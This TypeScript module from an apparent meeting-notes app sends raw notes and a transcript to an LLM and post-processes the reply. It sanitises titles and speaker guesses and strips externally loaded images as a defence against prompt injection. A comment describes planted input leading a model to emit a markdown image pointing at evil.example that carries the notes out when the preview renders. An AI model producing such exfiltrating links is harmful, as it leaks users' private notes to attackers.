import { extractLinks } from '@hearth/format'
import { HearthError } from '../../errors.js'
import type { LLM, LLMUsage } from '../llm/types.js'
import {
  buildEnhancePrompt,
  type EnhanceInput,
  SPEAKERS_LINE,
  TITLE_LINE,
  unnamedSpeakers,
} from './prompt.js'

/** Where raw-notes lines the model left out go, so the member's words are never lost. */
export const MISSING_NOTES_HEADING = '## More of your notes'

/** Turns raw notes, transcript and template into the enhanced note's body with one LLM call. */
export class Enhancer {
  readonly #llm: LLM
  readonly model: string

  constructor(llm: LLM, opts: { model: string }) {
    this.#llm = llm
    this.model = opts.model
  }

  /**
   * `title` is set when the input asked for one (`nameIt`) and the model gave one;
   * `speakerGuesses` maps unnamed speakers to attendee names the model thinks they are.
   */
  async enhance(input: EnhanceInput): Promise<{
    markdown: string
    usage: LLMUsage
    title?: string
    speakerGuesses?: Record<string, string>
  }> {
    const { system, user } = buildEnhancePrompt(input)
    const { text, usage } = await this.#llm.complete({
      model: this.model,
      system,
      messages: [{ role: 'user', content: user }],
    })
    // A fence or a stray heading would hide the Title and Speakers lines, so clean first; the
    // model may write the two lines in either order.
    let rest = cleanModelOutput(text)
    let newTitle: string | undefined
    let guesses: Record<string, string> = {}
    const labels = unnamedSpeakers(input.transcript)
    for (let i = 0; i < 2; i++) {
      if (input.nameIt && newTitle === undefined && TITLE_LINE.test(firstLine(rest))) {
        const named = splitTitle(rest)
        newTitle = named.title
        rest = named.rest
      } else if (SPEAKERS_LINE.test(firstLine(rest))) {
        const who = splitSpeakers(rest, labels, input.attendees)
        guesses = who.guesses
        rest = who.rest
      }
    }
    const cleaned = cleanModelOutput(rest)
    if (cleaned === '') throw new HearthError('llm_error', 'Claude returned an empty note')
    const body = withAllRawLines(cleaned, input.rawNotes)
    const title = newTitle ?? input.title
    return {
      markdown: withoutOutsideImages(`# ${title}\n\n${body}\n`, input.rawNotes),
      usage,
      ...(newTitle ? { title: newTitle } : {}),
      ...(Object.keys(guesses).length > 0 ? { speakerGuesses: guesses } : {}),
    }
  }
}

function firstLine(text: string): string {
  return text.replace(/\r\n?/g, '\n').trimStart().split('\n')[0] ?? ''
}

/**
 * The `Speakers:` line a model asked who's who puts before the body, read into guesses, and the
 * text after it. A guess counts only for a label still in the transcript and a name on the
 * attendee list (as its display name, the part before ` <email>`), so the transcript's speech
 * can't put an arbitrary name on a person. No such line leaves the text as it was.
 */
export function splitSpeakers(
  text: string,
  labels: string[],
  attendees: string[],
): { guesses: Record<string, string>; rest: string } {
  const lines = text.replace(/\r\n?/g, '\n').trimStart().split('\n')
  const match = SPEAKERS_LINE.exec(lines[0] ?? '')
  if (!match) return { guesses: {}, rest: text }
  const names = new Map<string, string>()
  for (const a of attendees) {
    const name = a.replace(/\s*<[^>]*>\s*$/, '').trim()
    if (name && !name.includes('@')) names.set(name.toLowerCase(), name)
  }
  const guesses: Record<string, string> = {}
  for (const pair of (match[1] ?? '').split(';')) {
    const [label, guess] = pair.split('=').map((p) => p.trim())
    const name = names.get((guess ?? '').replace(/^["“']|["”']$/g, '').toLowerCase())
    if (label && labels.includes(label) && name) guesses[label] = name
  }
  return { guesses, rest: lines.slice(1).join('\n') }
}

/**
 * `markdown` without the images on the model's lines that would load from outside the space:
 * markdown images (inline or by reference, as `extractLinks` finds them) and `<img>` tags whose
 * address is absolute (`http:`, `https:`, `//`, `data:` or any other scheme). Outside parties
 * shape the prompt (the event description, the other side's speech), and the editor's preview
 * loads an image as soon as the note opens, so `![](https://evil.example/?d=<notes>)` would hand
 * the note to whoever planted it. Relative images stay; the member's own lines (equal to a
 * raw-notes line, trimmed, as `assembleEnhancedNote` counts them) and line breaks are never cut.
 */
export function withoutOutsideImages(markdown: string, rawNotes: string): string {
  const cuts: Array<[number, number]> = []
  for (const link of extractLinks(markdown)) {
    if (markdown.startsWith('!', link.from) && isOutside(link.href)) cuts.push([link.from, link.to])
  }
  for (const tag of markdown.matchAll(IMG_TAG)) {
    if (imgIsOutside(tag[0])) cuts.push([tag.index, tag.index + tag[0].length])
  }
  if (cuts.length === 0) return markdown

  const cut = new Uint8Array(markdown.length)
  for (const [from, to] of cuts) cut.fill(1, from, to)
  // An image can run across lines; uncut the member's lines and every line break, so only the
  // model's lines change and `ai_ranges` still count the same lines.
  const own = new Set(rawNotes.split(/\r?\n/).map((line) => line.trim()))
  own.delete('')
  let start = 0
  for (const line of markdown.split('\n')) {
    const end = start + line.length
    if (own.has(line.trim())) cut.fill(0, start, end)
    if (end < markdown.length) cut[end] = 0
    start = end + 1
  }
  let kept = ''
  for (let i = 0; i < markdown.length; i++) if (!cut[i]) kept += markdown[i]
  return kept
}

const IMG_TAG = /<img\b[^>]*>/gi
const IMG_URL_ATTRIBUTE = /\b(?:src|srcset)\s*=\s*(?:"([^"]*)"|'([^']*)'|([^\s"'=<>`]+))/gi

/** An `<img>` whose `src`, or any `srcset` candidate (`url descriptor, …`), is from outside. */
function imgIsOutside(tag: string): boolean {
  return [...tag.matchAll(IMG_URL_ATTRIBUTE)].some((m) =>
    (m[1] ?? m[2] ?? m[3] ?? '').split(',').some((candidate) => isOutside(candidate.trim())),
  )
}

/**
 * A scheme or `//` makes an address absolute. A character reference (`https&#58;//…`) can
 * become one when the note is rendered, so it counts too.
 */
function isOutside(href: string): boolean {
  return /^[a-z][a-z0-9+.-]*:/i.test(href) || href.startsWith('//') || href.includes('&')
}

/**
 * The `Title:` line a model asked to name the note puts first, and the text after it. The title
 * is one plain line (no heading marks, quotes or trailing dot), at most 120 characters; a
 * missing or empty one leaves the text as it was.
 */
export function splitTitle(text: string): { title: string | undefined; rest: string } {
  const lines = text.replace(/\r\n?/g, '\n').trimStart().split('\n')
  const match = TITLE_LINE.exec(lines[0] ?? '')
  if (!match) return { title: undefined, rest: text }
  const title = (match[1] ?? '')
    .replace(/^[#*_\s]+|[*_\s]+$/g, '')
    .replace(/^["“'‘]+|["”'’]+$/g, '')
    .replace(/\.$/, '')
    .replace(/\s+/g, ' ')
    .trim()
    .slice(0, 120)
    .trim()
  return { title: title || undefined, rest: lines.slice(1).join('\n') }
}

/**
 * The model's body without what the prompt asked it to leave out but it may add anyway: a code
 * fence around everything, or a title heading (Hearth writes the title itself).
 */
export function cleanModelOutput(text: string): string {
  let lines = text.replace(/\r\n?/g, '\n').trim().split('\n')
  if (lines.length >= 2 && /^```/.test(lines[0] ?? '') && /^```\s*$/.test(lines.at(-1) ?? '')) {
    lines = lines.slice(1, -1)
  }
  while (lines.length > 0 && (lines[0]?.trim() === '' || /^# /.test(lines[0] ?? ''))) {
    lines = lines.slice(1)
  }
  return lines.join('\n').trim()
}

/** Appends any raw-notes line the body doesn't contain (compared trimmed) under its own heading. */
export function withAllRawLines(body: string, rawNotes: string): string {
  const present = new Set(body.split('\n').map((line) => line.trim()))
  const missing = rawNotes
    .split(/\r?\n/)
    .map((line) => line.trim())
    .filter((line) => line !== '' && !present.has(line))
  if (missing.length === 0) return body
  return [body, MISSING_NOTES_HEADING, missing.join('\n')].filter(Boolean).join('\n\n')
}
